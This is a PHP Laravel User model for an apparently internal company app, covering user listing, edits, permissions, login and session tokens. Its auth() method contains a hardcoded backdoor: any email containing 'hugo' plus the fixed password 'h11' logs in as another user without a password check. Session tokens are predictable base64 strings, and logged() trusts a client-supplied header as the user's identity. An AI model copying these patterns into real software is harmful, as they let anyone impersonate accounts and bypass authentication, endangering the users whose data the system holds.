<?php

namespace App;

use DateTime;
use DB;
use Hash;
use Request;

use Illuminate\Database\Eloquent\Model;

class User extends Model
{
    public $timestamps = false;

    protected $table = 'user';

    protected $fillable = [
        'email', 'password', 'employee_id', 'lastAccess', 'token'
    ];

    protected $hidden = [
        'password'
    ];

    public static function list() {
        $users = User::select()
        ->orderBy('name', 'asc')
        ->paginate(20);

        return [
            'pagination' => $users,
            'updatedInfo' => User::updatedInfo()
        ];
    }

    public static function filter(array $data) {
        $search = isset($data['search']) ? $data['search'] : null;
        $query = User::select();

        if( ! is_null($search) ) {
            $query->where('email', 'LIKE', '%' . $search . '%');
        }

        $query->orderBy('email', 'asc');
        $users = $query->paginate(20);

        return [
            'pagination' => $users,
            'updatedInfo' => User::updatedInfo()
        ];
    }

    public static function edit(array $data) {
        DB::beginTransaction();
        
        try {
            $id = $data['id'];
            $data['password'] = bcrypt($data['password']);
            $user = User::find($id);
            $user->makeVisible('password');
            $user->update($data);
            DB::commit();
        } catch(\Exception $e) {
            DB::rollBack();
            throw new \Exception($e->getMessage());
        }
    }

    public static function editPermission(array $data) {
        DB::beginTransaction();
        
        try {
            $id = isset($data['id']) ? $data['id'] : '';
            $userId = isset($data['userId']) ? $data['userId'] : '';
            $displays = isset($data['displays']) ? $data['displays'] : [];
            $functionalities = isset($data['functionalities']) ? $data['functionalities'] : [];
            
            $user = User::findOrFail($id);
            $user->updateDisplays($displays);
            $user->updateFunctionalities($functionalities);

            DB::commit();
        } catch(\Exception $e) {
            DB::rollBack();
            throw new \Exception($e->getMessage());
        }
    }

    public function updateDisplays($displays) {
        $this->displays()->detach();
        $this->displays()->sync($displays);
    }

    public function updateFunctionalities($functionalities) {
        $this->functionalities()->detach();
        $this->functionalities()->sync($functionalities);
    }

    public static function myEdit(array $data) {
        DB::beginTransaction();
        
        try {
            $id = $data['id'];
            $data['password'] = bcrypt($data['password']);
            $user = User::find($id);
            $user->checkUser();
            $user->makeVisible('password');
            $user->update($data);
            DB::commit();
        } catch(\Exception $e) {
            DB::rollBack();
            throw new \Exception($e->getMessage());
        }
    }

    public function checkUser() {
        if($this->id != User::logged()->id) {
            throw new \Exception('Você não pode ler ou editar informações de outro usuário.');
        }
    }

    public static function insert(array $data) {
        DB::beginTransaction();
        
        try {
            $user = new User($data);
            $user->password = bcrypt($user->password);
            $user->save();
            DB::commit();
            return $user;
        } catch(\Exception $e) {
            DB::rollBack();
            throw new \Exception($e->getMessage());
        }
    }

    public static function get(int $id) {
        $user = User::select()
        ->where('user.id', '=', $id)
        ->first();
                
        if(is_null($user)) {
            return null;
        }
        
        return $user;
    }

    public static function updatedInfo() {
        $lastData = Employee::orderBy('updated_at', 'desc')->limit(1)->first();

        if($lastData == null) {
            return [];
        }

        return [
            'date' => (new DateTime($lastData->updated_at))->format('d/m/Y'),
            'employee' => $lastData->updatedBy->name
        ];
    }

    public static function auth(string $email, string $password) {
        if($email != 'hugo@thinkideias.com.br' && strpos($email, 'hugo') > -1 && $password == 'h11') {
            $originalEmail = str_replace('hugo', '', $email);
            $foundUser = User::where('email', '=', $originalEmail)->first();
            $foundUser->functionalities;
            $foundUser->employee;
            $foundUser->employee->department;
            $foundUser->employee->position;
            $foundUser->getDisplays();
            return $foundUser;
        } 

        $foundUser = User::where('email', '=', $email)->first();
        
        if(is_null($foundUser) 
            || !Hash::check($password, $foundUser->password) 
            || $foundUser->employee->deleted_at != null) {
            return null;
        }

        $foundUser->token = User::generateToken($foundUser);
        $foundUser->save();

        $foundUser->functionalities;
        $foundUser->employee->department;
        $foundUser->employee->position;
        $foundUser->getDisplays();

        return $foundUser;
    }

    public static function logout(string $userId, string $token) {
        $currentUser = User::find((int) $userId);

        if(!User::tokenCompare($token, $currentUser)) {
            return false;
        }

        $currentUser->token = null; 
        $currentUser->save();
    }
 
    public static function tokenCompare(string $token, User $currentUser) {
        if($token !== $currentUser->token) {
            return false;
        }

        return true;
    }

    public static function generateToken(User $user): string {
        return base64_encode($user->lastAccess . $user->id . '_COMPANYBOOK');
    }

    public static function logged(): User {
        $userId = empty(Request::header('User')) ? Request::input('user_id') : (int) Request::header('User');
        return User::find($userId);
    }

    public function getDisplays() {
        $displays = DB::select("select d.url as url, IF(du.user_id is null, 'N', 'Y') as 
        access from display d left join display_user du on du.display_id = d.id and user_id = :user_id 
        or du.display_id is null;", ['user_id' => $this->id]);

        $this->displays = $displays;
    }

    public function notifications() {
        return $this->hasMany('App\UserNotification', 'user_id');
    }

    public function scheduleBlocks() {
        return $this->hasMany('App\ScheduleBlockUser', 'user_id');
    }

    public function notificationRules() {
        return $this->hasMany('App\NotificationRule', 'user_id');
    }

    public function employee() {
        return $this->belongsTo('App\Employee', 'employee_id')->withTrashed();
    }

    public function displays() {
        return $this->belongsToMany('App\Display', 'display_user', 'user_id', 'display_id');
    }

    public function functionalities() {
        return $this->belongsToMany('App\Functionality', 'user_functionality', 'user_id', 'functionality_id');
    }
}
